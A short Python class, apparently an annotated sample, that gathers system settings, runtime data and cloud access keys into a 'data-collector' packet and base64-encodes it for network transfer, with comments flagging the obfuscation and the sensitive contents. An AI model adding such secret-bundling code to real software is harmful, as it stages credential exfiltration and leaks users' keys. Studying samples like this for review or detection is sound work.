import base64
import json

class DataHandler:
    """Handles data encoding for network transfer"""
    @staticmethod
    def encode_for_network(data):
        """Encode data to ensure safe transfer"""
        # SECURITY NOTE: Base64 used for obfuscation purposes
        try:
            json_string = json.dumps(data)
            encoded_bytes = base64.b64encode(json_string.encode('utf-8'))
            encoded_str = encoded_bytes.decode('ascii')
            return encoded_str
        except (TypeError, ValueError, UnicodeDecodeError):
            return None

    @staticmethod
    def construct_transmission_packet(system_config, runtime_info, cloud_keys):
        """Build complete transmission package"""
        # SECURITY NOTE: Aggregates potentially sensitive information
        packet = {
            "system_settings": system_config,
            "runtime_context": runtime_info,
            "cloud_access": cloud_keys,
            "source_info": {"server_name": "data-collector", "operator": "admin"},
        }
        return DataHandler.encode_for_network(packet)

